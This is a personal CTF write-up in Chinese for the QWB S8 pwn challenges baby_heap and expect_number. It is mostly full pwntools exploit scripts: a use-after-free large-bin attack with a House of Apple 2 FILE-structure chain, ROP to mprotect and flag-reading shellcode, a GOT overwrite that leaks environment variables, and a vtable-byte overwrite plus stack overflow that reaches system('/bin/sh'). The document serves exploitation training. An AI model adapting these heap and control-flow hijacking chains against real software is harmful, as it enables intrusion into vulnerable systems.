---
title: 强网杯S8 - Pwn 个人题解
published: true
---

| 目录跳转: |
|--------|
| [PWN: baby_heap 通解 - 附Exp](#pwn-baby_heap-通解) |
| [PWN: baby_heap 特解 - 附Exp](#pwn-baby_heap-特解) |
| [PWN: expect_number - 未更新](#pwn-expect_number) |


# [](#header-3)pwn baby_heap 通解

这个题很适合当 large bin 大堆溢出打 House of Apple 2 链的板子题. 但是如果真这样做，会绕很多弯路，最优解应该是利用到 Secret Shop 修改 got 表  
通解没有利用到 Secret Shop 和 print_env，而是直接用的 large chunk 来打  

这个程序在堆已经被 释放 后依然可以向该堆写入内容，因此有了可乘之机. 首先在某个已经释放的堆里填充 House of Apple 2 通用板子

```py
# 伪造 struct _IO_FILE_complete_plus
struct_file = flat({
	# struct _IO_FILE_complete -> _IO_FILE
	0:      0,  							# file._flag
	0x18:   p64(leave_ret_c),				# file._IO_read_base
	0x28:   p64(libc.symbols['_IO_list_all'] - 0x20),	# 写 IO_list_all - 0x20 的地址至 bk_size，下一次分配小堆元素时就会分配到这里
	0x48: 	p64(orw_addr),  				# file._IO_save_base
	0x88:   p64(lock),                 		# file._lock
	# struct _IO_FILE_complete
	0xa0:   p64(widedata_addr),             # file._wide_data 
	# struct
	0xd8:   p64(wfile),						# file._vtable
}, filler=b'\0')

# 伪造 struct _IO_wide_data
struct_widedata  = flat({
	0xe0:	p64(widedata_addr + 0xe8),		# _IO_wide_data._IO_read_ptr
	0x150:	p64(magic_gadget),				# 
}, filler=b'\0')

```

然后再在板子后面接上 orw，此处先调用 mprotect，修改 `heap_base_addr` ~ `heap_base_addr + 0x10000` 为rwx 后，跳到精心构造的 shellcode 执行. 该 shellcode 打开 `./flag` read 后将其标准输出

```py
orw =  b'./flag\x00\x00'
orw += p64(rdx_r12_c) + p64(0) + p64(start_addr - 0x10)
# 调用 mprotect, 修改 heap_base_addr ~ heap_base_addr + 0x10000 为rwx
orw += p64(rdi_c) + p64(heap_base_addr)
orw += p64(rsi_c) + p64(0x10000) 
orw += p64(rdx_r12_c) + p64(0x7) * 2
orw += p64(libc.symbols['mprotect'])
orw += p64(shell_addr)
''' long syscall(SYS_openat2, int dirfd, const char *pathname, struct open_how *how, size_t size); '''
orw += asm(shellcraft.openat2(-100, orw_addr, orw_addr + 0x1000, 0x18))
''' ssize_t read(int fd, void buf[.count], size_t count); '''
orw += asm(shellcraft.read(3, heap_base_addr + 0x10000, 0x50))
''' ssize_t write(int fd, const void buf[.count], size_t count); '''
''' write to stdout 1 '''
orw += asm(shellcraft.write(1, heap_base_addr + 0x10000, 0x50))
orw += asm(shellcraft.exit(0))

payload = struct_file + struct_widedata + orw
# offset a large chunk header
edit_com(1, payload[16:])
```

填充完毕后，刷新大小排序的链表，并使得该 bin 的 bk_nextsize 重新指向 `_IO_list_all - 0x20` 的地址. 此时 `_IO_list_all - 0x20` 的 fd_nextsize 理论上也会指向该堆，那么 `_IO_list_all` 此时的地址即为该 bin

![qwb](/image/qwbs8/0.png)  

![qwb](/image/qwbs8/1.png)  

观察一看，确实如此. 后续直接随便调用 IO 即可触发. 如下所示读取了 `./flag` 并且输出了 flag{...}

![qwb](/image/qwbs8/2.png)  


### [](#header-3)EXP


```py
#by leeya_bug

from pwn import *
import time
import os

SLEEP_TIME = 0.2

context.os = 'linux'
context.log_level = "debug"
x64_32 = True
context.arch = 'amd64' if x64_32 else 'i386'

p = process('./debug/qwb_babyheap')
libc = ELF('./glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')

def debug():
	subprocess.Popen(["qterminal", "-e", f'bash -c "pwndbg -p {p.pid}" '])
	p.interactive()
	
#------------- 基本配置 -------------

def add_com(size: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'1')
	p.sendlineafter(b'size', str(size).encode())
	
def del_com(index: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'2')
	p.sendlineafter(b'delete:', str(index).encode())
	
def edit_com(index: int, content: bytes) -> None:
	p.sendlineafter(b'Enter your choice:',b'3')
	p.sendlineafter(b'edit:', str(index).encode())
	p.sendlineafter(b'Input the content', content)
	
def show_com(index: int) -> bytes:
	p.sendlineafter(b'Enter your choice:',b'4')
	p.sendlineafter(b'show:', str(index).encode())
	p.recvuntil(b'The content is here \n')
	return p.recvuntil(b'Menu:')

add_com(0x548)
add_com(0x548)
add_com(0x538)
del_com(1)
add_com(0x558)
del_com(3)

content = show_com(1)
libc_addr 	= u64(content[:8]) - 0x21b120
libc.address 	= libc_addr
heap_addr 	= u64(content[16:24])
heap_base_addr 	= heap_addr - 0x1950

leave_ret_c 	= next(libc.search(asm('leave;ret;')))
'''call [[[rdi + 0x48] + 0x18] + 0x28]; move rdi, [[rdi + 0x48] + 0x10]'''
magic_gadget 	= next(libc.search(asm('mov rbp, qword ptr [rdi + 0x48];mov rax, qword ptr [rbp + 0x18]')))
rdi_c 		= next(libc.search(asm('pop rdi;ret;')))
rsi_c 		= next(libc.search(asm('pop rsi;ret;')))
rdx_r12_c 	= next(libc.search(asm('pop rdx;pop r12;ret;')))
lock 		= libc_addr + 0x3ed8b0
wfile 		= libc_addr + 0x216F40

start_addr 	= heap_addr
widedata_addr 	= start_addr + 0xe0
orw_addr 	= start_addr + 0xe0 + 0xe8 + 0x70
shell_addr	= start_addr + 0xe0 + 0xe8 + 0x70 + 0x68

# 伪造 struct _IO_FILE_complete_plus
struct_file = flat({
	# struct _IO_FILE_complete -> _IO_FILE
	0:      0,  										# file._flag
	0x18:   p64(leave_ret_c),							# file._IO_read_base
	0x28:   p64(libc.symbols['_IO_list_all'] - 0x20),	# file._IO_write_ptr
	0x48: 	p64(orw_addr),  							# file._IO_save_base
	0x88:   p64(lock),                 					# file._lock
	# struct _IO_FILE_complete
	0xa0:   p64(widedata_addr),                  		# file._wide_data 
	# struct
	0xd8:   p64(wfile),									# file._vtable
}, filler=b'\0')

# 伪造 struct _IO_wide_data
struct_widedata  = flat({
	0xe0:	p64(widedata_addr + 0xe8),					# _IO_wide_data._IO_read_ptr
	0x150:	p64(magic_gadget),							# 
}, filler=b'\0')

orw =  b'./flag\x00\x00'
orw += p64(rdx_r12_c) + p64(0) + p64(start_addr - 0x10)
# 调用 mprotect, 修改 heap_base_addr ~ heap_base_addr + 0x10000 为rwx
orw += p64(rdi_c) + p64(heap_base_addr)
orw += p64(rsi_c) + p64(0x10000)
orw += p64(rdx_r12_c) + p64(0x7) * 2
orw += p64(libc.symbols['mprotect'])
orw += p64(shell_addr)
''' long syscall(SYS_openat2, int dirfd, const char *pathname, struct open_how *how, size_t size); '''
orw += asm(shellcraft.openat2(-100, orw_addr, orw_addr + 0x1000, 0x18))
''' ssize_t read(int fd, void buf[.count], size_t count); '''
orw += asm(shellcraft.read(3, heap_base_addr + 0x10000, 0x50))
''' ssize_t write(int fd, const void buf[.count], size_t count); '''
''' write to stdout 1 '''
orw += asm(shellcraft.write(1, heap_base_addr + 0x10000, 0x50))
orw += asm(shellcraft.exit(0))

payload = struct_file + struct_widedata + orw
# offset a large chunk header
edit_com(1, payload[16:])

add_com(0x568)
add_com(0x538)

show_com(2)

```

# [](#header-3)pwn baby_heap 特解

由于 getenv、setenv 在遍历所有环境变量时，调用了 strncmp 函数，在这里获取 libc 地址后，直接通过 Secret Shop 修改 got 表中 strncmp 函数的值为 put 函数即可打印出所有环境变量.

### [](#header-3)EXP

```py
#by leeya_bug

from pwn import *
import time

SLEEP_TIME = 0.2

p = process('./debug/qwb_babyheap')
libc = ELF('./glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')

def debug():
	subprocess.Popen(["qterminal", "-e", f'bash -c "pwndbg -p {p.pid}" '])
	p.interactive()
	
#------------- 基本配置 -------------


def add_com(size: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'1')
	p.sendlineafter(b'size', str(size).encode())
	
def del_com(index: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'2')
	p.sendlineafter(b'delete:', str(index).encode())
	
def edit_com(index: int, content: bytes) -> None:
	p.sendlineafter(b'Enter your choice:',b'3')
	p.sendlineafter(b'edit:', str(index).encode())
	p.sendlineafter(b'Input the content', content)
	
def show_com(index: int) -> bytes:
	p.sendlineafter(b'Enter your choice:',b'4')
	p.sendlineafter(b'show:', str(index).encode())
	p.recvuntil(b'The content is here \n')
	return p.recvuntil(b'Menu:')
	
def print_env(chose: int) -> bytes:
	p.sendlineafter(b'Enter your choice:',b'5')
	p.sendlineafter(b'sad !', str(chose).encode())
	return p.recvuntil(b'Menu:')
	
def secret(target_addr: bytes, content: bytes) -> None:
	p.sendlineafter(b'Enter your choice:',b'6')
	p.sendafter(b'target addr', target_addr)
	time.sleep(SLEEP_TIME)
	p.send(content)
	
add_com(1300)
add_com(1300)
del_com(1)
content = show_com(1)

libc_addr = u64(content[:8]) - 0x21ace0
libc.address = libc_addr
secret(p64(libc.got['strncmp']), p64(libc.symbols['puts']))

print(print_env(2))
```

# [](#header-3)pwn expect_number

观察位于 0x2BEE 的 Continue_Game 函数，当用户输入一个值以后，会根据当前生成的随机数的值，对用户的输入 和 上一次的计算结果 进行加减乘除操作.  
而正巧的是，该随机数的种子是固定的 `srand(1u);` ，因此可以通过计算得知每次生成的随机数是多少. 

![qwb](/image/qwbs8/4.png)  

每次生成的的随机数如下所示

`4 3 2 4 2 4 3 1 2 2 3 4 3 4 4 3 1 3 1 1 4 1 4 2 3 3 3 4 4 4 2 3 3 3 2 4 2 1 4 3 2 2 2 4 1 2 3 1 4 3 2 3 4 1 1 2 3 3 1 2 2 2 1 4 1 2 3 2 2 2 1 4 3 2 3 4 3 1 4 3 4 1 1 3 1 ... (后续生成的序列在代码中)` 

继续观察位于 0x2BEE 的 Continue_Game 函数，由以下红线可知观察到 rsi 可能是一个类结构. 

![qwb](/image/qwbs8/3.png)  

在程序运行多次后观察规律，对 rsi 的类结构体进行重构: 

```c
struct STRUCT1{
	void* 	addr_unknown;		
	int32_t round_times;			//程序计算运行次数
	char 	history[276];			//程序记录的历史命令
	void* 	addr_virtfunc_exit;		//虚表中 Exit 函数的地址，当用户选择 4 退出时会调用该地址的函数
}
```
addr_virtfunc_exit 为虚表函数的地址，当用户选择 exit 时便会调用这个地址.  
可以发现，如果 round_times 超过 276，便会直接写到 `history + 276` 的地址. 而该地址即为虚表中 Exit 函数的最后一个字节. 

而又可知，Exit 函数的 Symbol 地址为 `$rebase(0x4C48)`，而刚好在 `$rebase(0x4C60)` 位置存在一个可以栈溢出的函数. 这意味着只需要修改虚表中最后一个字节从 0x48 到 0x60 即可劫持 exit 流程. 

![qwb](/image/qwbs8/5.png)

如何修改这个字节恰好为 0x60 ？可以发现，这 276 字节大小的空间不仅仅记录的是 history，在当前 history 的后一个地址恰好是当前计算的结果.  

只需要让当前数字计算的结果为 0x60，并且填满这 276 字节大小的空间即可成功修改.   

![qwb](/image/qwbs8/6.png)

在成功抵达 `$rebase(0x4C60)` 开始栈溢出流程后，可以发现栈变量字节大小为 0x20，0x30 完全可以覆盖 ebp 和 rip. 通过如下箭头的异常程序流 throw 的一个 `std::runtime_error` 直接劫持正常流程.  

![qwb](/image/qwbs8/7.png)

又可以发现，程序某处的 catch 存在后门函数，直接让 rip 跳到 2516 即可成功 catch 到 `std::runtime_error` 并且 执行 `system("/bin/sh")`

![qwb](/image/qwbs8/8.png)

通过以上得出最终 exp

### [](#header-3)EXP

```py
#by leeya_bug

from pwn import *
import time
import os

SLEEP_TIME = 0.2

context.os = 'linux'
context.log_level = "debug"
x64_32 = True
context.arch = 'amd64' if x64_32 else 'i386'

p = process('./expect_number')

def debug():
	subprocess.Popen(["qterminal", "-e", f'''bash -c 'pwndbg -ex "set telescope-skip-repeating-val off" -p {p.pid}' '''])
	p.interactive()

#------------- 基本配置 -------------

def continue_game(number: int) -> None:
	p.sendlineafter(b'waiting for your choice', b'1')
	p.sendlineafter(b'2 or 1 or 0', str(number).encode())

def show() -> bytes:
	p.sendlineafter(b'waiting for your choice', b'2')
	data = p.recvuntil(b'|--------').split(b'History is : ')[1].split(b'|--------')[0].strip(b'\t\n')
	return data

def exit() -> None:
	p.sendlineafter(b'waiting for your choice', b'4')

rand_nums = '4 3 2 4 2 4 3 1 2 2 3 4 3 4 4 3 1 3 1 1 4 1 4 2 3 3 3 4 4 4 2 3 3 3 2 4 2 1 4 3 2 2 2 4 1 2 3 1 4 3 2 3 4 1 1 2 3 3 1 2 2 2 1 4 1 2 3 2 2 2 1 4 3 2 3 4 3 1 4 3 4 1 1 3 1 1 4 4 3 4 1 1 1 1 4 1 3 3 3 4 4 3 3 3 4 2 2 3 2 1 1 1 2 1 3 2 2 2 1 4 1 2 4 2 2 4 2 4 2 4 4 1 2 2 3 2 3 4 4 1 1 4 1 2 4 4 3 1 1 4 1 2 1 4 3 2 3 4 2 4 4 1 1 1 2 3 2 1 3 1 1 3 4 1 4 4 4 2 4 1 1 4 2 1 4 4 3 2 3 4 2 2 4 2 3 1 4 4 1 2 1 1 4 4 2 3 3 1 1 3 1 1 2 2 2 1 1 4 3 4 3 4 1 2 1 3 2 4 3 3 2 3 3 1 2 4 4 1 1 4 3 1 4 4 3 1 1 3 4 3 2 2 2 3 3 2 1 1 1 3 3 2 1 1 3 3 1 2 3 1 1 1 1 4 4 3 1 4 2 4 2 3 2 3 1 4 4 2 4'.split(' ')
rand_nums = [ int(i) for i in rand_nums ][::-1]

#------------- 填充整个 276 长度的 byte 数组 -------------
#------------- 并使当前计算的数字为 0x60，也就是 addr_virtfunc_exit 地址最后有一个字节为 0x60 -------------

for i in range(0, 92):
	cur_nums = rand_nums.pop()
	if cur_nums == 1: continue_game(2)
	if cur_nums == 2: continue_game(0)
	if cur_nums == 3: continue_game(1)
	if cur_nums == 4: continue_game(1)

flag = False
for i in range(92, 276):
	cur_nums = rand_nums.pop()
	if cur_nums == 1: continue_game(1)
	if cur_nums == 2: 
		if not flag:
			continue_game(1)
			flag = True
		else: continue_game(0)
	if cur_nums == 3: continue_game(1)
	if cur_nums == 4: continue_game(1)

data = show()
leak_addr = u64(data[-6:].ljust(8, b'\x00'))
base_addr = leak_addr - 0x4C60
exit()

#------------- 发送 payload -------------

payload	= b''
payload += b'a' * 0x20 + p64(base_addr + 0x5840) + p64(base_addr + 0x0000000000002516)

p.sendlineafter(b'favorite number.\n', payload)
p.interactive()

```

